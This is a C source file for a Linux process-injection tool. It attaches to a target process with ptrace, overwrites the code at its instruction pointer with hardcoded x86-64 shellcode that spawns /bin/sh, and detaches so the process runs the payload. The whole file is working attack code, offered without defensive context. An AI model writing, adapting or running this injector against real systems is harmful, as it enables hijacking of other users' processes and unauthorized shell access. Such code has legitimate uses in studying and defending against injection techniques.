// This program uses PTRACE to attach and inject code into a process
// gcc process-injection.c -o injection

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

// Function to inject shellcode into process
int inject_shellcode(pid_t pid, unsigned char *src, void *dst, int len) {
  int i;
  uint32_t* s = (uint32_t*) src;
  uint32_t* d = (uint32_t*) dst;
  for(i = 0; i < len; i+=4, s++, d++) {
    if(ptrace(PTRACE_POKETEXT, pid, d, *s) < 0) {
      printf("POKETEXT error\n");
      return -1;
    }
  }
  return 0;
}

int main (int argc, char* argv[]) {
  pid_t target;
  struct user_regs_struct registers;
  int syscall;
  long dst;

  if(argc != 2) {
    printf("Usage:\n\t ./%s <pid>\n", argv[0]);
    exit(1);
  }

  target = atoi(argv[1]);
  // Attach the process
  printf("+ Tracing Process %d\n", target);
  if( ptrace(PTRACE_ATTACH, target, NULL, NULL) < 0) {
    printf("Ptrace error\n");
    exit(1);
  }
  // When ptrace, the target process receives SIGSTOP. wait(NULL) ensures that
  // the parent process waits for the stop to occur
  wait(NULL);

  // Get process registers
  printf("+ Getting Registers\n");
  if(ptrace(PTRACE_GETREGS, target, NULL, &registers) < 0) {
    printf("Ptrace register error\n");
    exit(1);
  }

  // Inject shellcode at rip for 64 bit eip for 32 bit
  printf("+ Injecting Shellcode at %p\n", (void*)registers.rip);
  char* shellcode = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05";
  int shellcode_size = strlen(shellcode);
  printf("shellcode size is: %d\n", shellcode_size);
  inject_shellcode(target, shellcode, (void*)registers.rip, 24);
  //registers.rip += 2;

  // Reset the registers in the process
  printf("+ Setting instruction pointer to %p\n", (void*)registers.rip);
  if(ptrace(PTRACE_SETREGS, target, NULL, &registers) < 0) {
    printf("Ptrace register set error\n");
    exit(1);
  }
  printf("+ Run it\n");

  if(ptrace(PTRACE_DETACH, target, NULL, NULL) < 0) { // subtracts 2 from rip
    printf("Ptrace detaching error\n");
    exit(1);
  }

  return 0;
}
